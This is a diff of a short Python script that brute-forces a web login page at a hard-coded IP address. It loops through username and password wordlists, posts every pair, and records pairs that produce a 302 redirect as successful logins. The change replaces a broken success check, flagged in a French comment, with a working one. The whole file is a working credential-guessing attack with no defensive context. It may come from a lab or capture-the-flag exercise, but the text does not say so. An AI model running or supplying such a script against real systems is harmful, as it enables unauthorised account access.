@@ -2,27 +2,31 @@ import requests
 
 r = requests.Session()
 
-url = 'http://51.15.136.118:80/pageid.php'
+url = 'http://51.15.136.118:80/login.php'
 
 with open('./wordlists/userlist.txt', 'r') as userfile:
     users = userfile.readlines()
 with open('./wordlists/passwordlist.txt', 'r') as passfile:
     passwords = passfile.readlines()
-i=0
+
+results = []
+
 for user in users:
     for password in passwords:
-        i+=1
-        print(i)
         user = user.strip()
         password = password.strip()
         data = {'username': user, 'password': password}
-        print(data)
-        a = r.post(url, data=data)
-        print(a.status_code)
-        """ fonctionne pas, met 200 mm qd requête est vraie, plutôt mettre qd ya redirection = récupère data """
-        if (a.status_code) != 200:
-            print(f'Successful login with username = "{user}" : and password = "{password}".')
-            break
-
+        response = r.post(url, data=data, allow_redirects=False)
+        if response.status_code == 302:  # Redirection
+            location = response.headers['Location']
+            result = {'user': user, 'password': password, 'status': response.status_code, 'location': location}
+            results.append(result)
+            print(f'Successful login with username = "{user}" and password = "{password}"')
+            
+# Print results in a table
+print("-------------------------------------------------------------------")
+print("{:<20} {:<20} {:<10} {:<50}".format('Username', 'Password', 'Status', 'Location'))
+for result in results:
+    print("{:<20} {:<20} {:<10} {:<50}".format(result['user'], result['password'], result['status'], result.get('location', '')))
         
 
